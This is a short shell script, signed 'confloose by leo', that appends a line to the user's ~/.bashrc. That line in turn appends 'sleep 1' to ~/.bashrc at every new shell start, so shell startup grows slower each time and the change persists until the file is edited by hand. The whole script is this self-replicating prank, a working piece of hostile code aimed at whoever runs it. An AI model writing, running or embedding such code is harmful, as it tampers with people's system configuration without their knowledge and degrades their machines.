#!/bin/sh

tempdir=$(mktemp -d)

echo "echo 'sleep 1 # confloose by leo' >> \"$HOME/.bashrc\"" >> "$HOME/.bashrc"
